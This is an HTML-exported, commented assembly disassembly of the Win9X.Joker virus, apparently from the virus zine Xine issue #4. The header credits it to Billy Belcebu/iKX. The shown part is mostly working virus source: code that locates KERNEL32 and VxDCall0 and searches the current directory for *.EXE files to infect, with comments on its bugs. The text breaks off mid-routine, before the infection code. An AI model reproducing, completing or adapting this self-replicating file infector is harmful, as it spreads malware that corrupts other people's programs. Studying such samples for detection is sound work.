<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #4 - Phile 312 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Win9X.Joker</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Name            : Win9X.Joker (?)</span><span class="sc0">
</span><span class="sc1">; Version         : N/A</span><span class="sc0">
</span><span class="sc1">; Original Author : Unknown</span><span class="sc0">
</span><span class="sc1">; Original Size   : 940 bytes</span><span class="sc0">
</span><span class="sc1">; Platform        : Win9x</span><span class="sc0">
</span><span class="sc1">; Kind            : Direct action PE infector</span><span class="sc0">
</span><span class="sc1">; Origin          : Unknown</span><span class="sc0">
</span><span class="sc1">; Dissassembly by : Billy Belceb£/iKX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Some comments   :</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; All about this  virus is a mistery. It hasn't any sign, or copyright texts,</span><span class="sc0">
</span><span class="sc1">; so i can't know about who is the author of this virus. If i had to guess it</span><span class="sc0">
</span><span class="sc1">; basing myself in the coding  style, this  virus would be  from one  of this</span><span class="sc0">
</span><span class="sc1">; three guys: JHB, Murkry or Mark  Ludwig. But, i'm not here  for suppose the</span><span class="sc0">
</span><span class="sc1">; authory of this virus, i'm here just  for disassemble it :) About the  name</span><span class="sc0">
</span><span class="sc1">; i've given  to this virus, it's  another supposition: it's the  name of the</span><span class="sc0">
</span><span class="sc1">; section that is added to all infected files by this virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Well, about what  this virus does, it's very simple. It searches trough the</span><span class="sc0">
</span><span class="sc1">; current directory for files, and  infects them by adding a new section. The</span><span class="sc0">
</span><span class="sc1">; virus will only infect two  files per run. The new  section added will have</span><span class="sc0">
</span><span class="sc1">; the  name  of "Joker1", so  that's  why  i  called this  virus in that way.</span><span class="sc0">
</span><span class="sc1">; This virus has one enormous bug that will make it to avoid the infection of</span><span class="sc0">
</span><span class="sc1">; almost all PE files it  tries to, anyway  the coder  of this tiny virus has</span><span class="sc0">
</span><span class="sc1">; shown good skills, because he  does some really clever  things. The code is</span><span class="sc0">
</span><span class="sc1">; not specially optimized but anyway, it's not a problem. The thing that most</span><span class="sc0">
</span><span class="sc1">; impacted me is the fact that this virus DOESN'T get the delta offset in any</span><span class="sc0">
</span><span class="sc1">; place. It's, at least, strange :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus  will not  be  able to spread under NT, because instead of using</span><span class="sc0">
</span><span class="sc1">; APIs, it only  searches for  the VxDCall0 API, and  uses the Int21_Dispatch</span><span class="sc0">
</span><span class="sc1">; function of the said API, so  the virus  is very similar to a DOS infector,</span><span class="sc0">
</span><span class="sc1">; but under Windows. The problem  is that  in  WinNT that API doesn't exists.</span><span class="sc0">
</span><span class="sc1">; So, this  virus  will  only  be able  to replicate in  Win95 and  Win98 OS.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus doesn't manifest itself in any form, it's harmless.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This  is my  third  disassembly (and i hope  it won't be the last), and the</span><span class="sc0">
</span><span class="sc1">; first one virus i have disassembled (previously i had disassembled a tunne-</span><span class="sc0">
</span><span class="sc1">; ling engine and a poly  engine). It was  done all  the 27th of June. Enjoy!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (c) 1999 Billy Belcebu/iKX</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc2">.386</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">

        </span><span class="sc9">.data</span><span class="sc0">

        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; Some data for TLINK</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Virus data</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">03ACh</span><span class="sc0">

</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0004h</span><span class="sc0">
</span><span class="sc5">FindData</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0404h</span><span class="sc0">

</span><span class="sc1">;typedef struct _WIN32_FIND_DATA {</span><span class="sc0">
</span><span class="sc1">;   DWORD dwFileAttributes;</span><span class="sc0">
</span><span class="sc1">;   FILETIME ftCreationTime;            ;DD ?,?</span><span class="sc0">
</span><span class="sc1">;   FILETIME ftLastAccessTime;          ;DD ?,?</span><span class="sc0">
</span><span class="sc1">;   FILETIME ftLastWriteTime;           ;DD ?,?</span><span class="sc0">
</span><span class="sc1">;   DWORD nFileSizeHigh;</span><span class="sc0">
</span><span class="sc1">;   DWORD nFileSizeLow;</span><span class="sc0">
</span><span class="sc1">;   DWORD dwReserved0;</span><span class="sc0">
</span><span class="sc1">;   DWORD dwReserved1;</span><span class="sc0">
</span><span class="sc1">;   CHAR cFileName[MAX_PATH];</span><span class="sc0">
</span><span class="sc1">;   CHAR cAlternateFileName[ 14 ];</span><span class="sc0">
</span><span class="sc1">;} WIN32_FIND_DATA</span><span class="sc0">

</span><span class="sc5">FileSizeHigh</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0420h</span><span class="sc0">
</span><span class="sc5">FileSizeLow</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0424h</span><span class="sc0">
</span><span class="sc5">FileAttributes</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0430h</span><span class="sc0">

</span><span class="sc1">; ---</span><span class="sc0">

</span><span class="sc5">FileHandle</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0544h</span><span class="sc0">
</span><span class="sc5">SearchHandle</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0548h</span><span class="sc0">
</span><span class="sc5">ASizeOfRawData</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">054Ch</span><span class="sc0">
</span><span class="sc5">Ptr2LastSection</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0550h</span><span class="sc0">
</span><span class="sc5">AVirusSize</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0554h</span><span class="sc0">
</span><span class="sc5">InfCounter</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0558h</span><span class="sc0">
</span><span class="sc5">PushImm32</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">055Ch</span><span class="sc0">
</span><span class="sc5">OldEIP</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">055Dh</span><span class="sc0">
</span><span class="sc5">WorkSpace</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0564h</span><span class="sc0">

</span><span class="sc5">HostEIP</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0584h</span><span class="sc0">
</span><span class="sc5">RetAddress</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0588h</span><span class="sc0">

        </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; This is the virus code</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_generation</span><span class="sc4">-</span><span class="sc2">400000h</span><span class="sc0">

</span><span class="sc1">; The above coded will be patched during infections</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">; Save all registers</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WorkSpace</span><span class="sc0">          </span><span class="sc1">; Make space for stack frame</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                </span><span class="sc1">; Save it in EBP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@1</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; EAX = An address into host own process</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckBase</span><span class="sc0">               </span><span class="sc1">; Get ImageBase of current process</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HostEIP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RetAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; See if NULL return address</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ExitVirus</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RetAddress</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; EAX = Return address</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckBase</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Error?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ExitVirus</span><span class="sc0">               </span><span class="sc1">; Shit if so...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RetAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetVxDCall0</span><span class="sc0">             </span><span class="sc1">; Try to get the VxDCall0</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Error?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ExitVirus</span><span class="sc0">               </span><span class="sc1">; Shit if so...</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfCounter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Set infection counter</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFirstFile</span><span class="sc0">           </span><span class="sc1">; Find a file for infect</span><span class="sc0">

</span><span class="sc5">InfectAnother</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Error returned?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ExitVirus</span><span class="sc0">               </span><span class="sc1">; Damn...</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfCounter</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">ExitVirus</span><span class="sc0">               </span><span class="sc1">; Did we infected one file? If so, go away</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">              </span><span class="sc1">; Infect!</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNextFile</span><span class="sc0">            </span><span class="sc1">; Find another file</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectAnother</span><span class="sc0">

</span><span class="sc5">ExitVirus</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WorkSpace</span><span class="sc0">          </span><span class="sc1">; Restore stack frame</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                            </span><span class="sc1">; Restore all registers</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">                            </span><span class="sc1">; And return control to host</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; This routine searches for PE mark in headers (for get ImageBase &amp; K32)</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CheckBase</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">; Save all registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                </span><span class="sc1">; Make a stack frame</span><span class="sc0">

</span><span class="sc5">SetSEHandSearch</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4010B4h</span><span class="sc0">                 </span><span class="sc1">; SEH handler address (?)</span><span class="sc0">

</span><span class="sc1">; BUG! If a fault occurs, this is pointing to a hardcoded address, and it's</span><span class="sc0">
</span><span class="sc1">; not fixed with delta offset as it should be...</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; Save old SEH handler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">               </span><span class="sc1">; Put the new one</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">Check4MZ_PE</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFF000h</span><span class="sc0">         </span><span class="sc1">; Align to page</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">; Save all registers</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">; Get a word</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"ZM"</span><span class="sc0">                </span><span class="sc1">; MZ mark?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">continue_search</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ah</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"EP"</span><span class="sc0">                </span><span class="sc1">; Check for PE sign...</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">K32_Exit</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">K32_Exit</span><span class="sc0">

</span><span class="sc5">continue_search</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0"> 
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Check4MZ_PE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Fix stack</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0"> 
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; Restore old SEH handler</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">                     </span><span class="sc1">; Fix stack (shit from new SEH handler)</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">              </span><span class="sc1">; Substract one page...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SetSEHandSearch</span><span class="sc0">         </span><span class="sc1">; and continue searching!</span><span class="sc0">

</span><span class="sc5">K32_Exit</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0"> 
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; Restore old SEH handler</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">; Clear shit of stack (new SEH handler)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">          </span><span class="sc1">; EAX = ESI after pushad</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                            </span><span class="sc1">; Restore all the registers</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Get the VxDCall0 API from KERNEL32 export table</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">GetVxDCall0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; Save EBX (used in routine)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Save EAX (K32 base address)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EBX = Pointer to PE sign</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; RVA &gt;&gt; VA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; And now lookout in the exports for</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; the first API exported, that is</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; the VxDCall0! :)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EAX = VxDCall0 API</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Store VxDCall0 into FS:14h address</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Restore K32 base address in EAX</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; Restore EBX</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">                            </span><span class="sc1">; Return to caller :)</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Find the first file in the current directory</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">FindFirstFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">714Eh</span><span class="sc0">               </span><span class="sc1">; EAX = LFN FindFirstFile funciton</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                            </span><span class="sc1">; Convet word AX into doubleword EAX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PerformSearch</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; EXE Wildcard</span><span class="sc0">

</span><span class="sc5">PerformSearch</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; EDX = ASCIIz wildcard</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindData</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EDI = FindData record</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; ECX = Attributes</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Date time format</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; ESI = 1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">ExitSearch</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Exit with error</span><span class="sc0">

</span><span class="sc5">ExitSearch</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SearchHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Store search handle</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Find next files</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">FindNextFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">714Fh</span><span class="sc0">               </span><span class="sc1">; AX = LFN FindNextFile function</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                            </span><span class="sc1">; Convert word AX into doubleword EAX</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindData</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EDI = Pointer to FindData struc</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; ESI = DataTime format</span><span class="sc0">
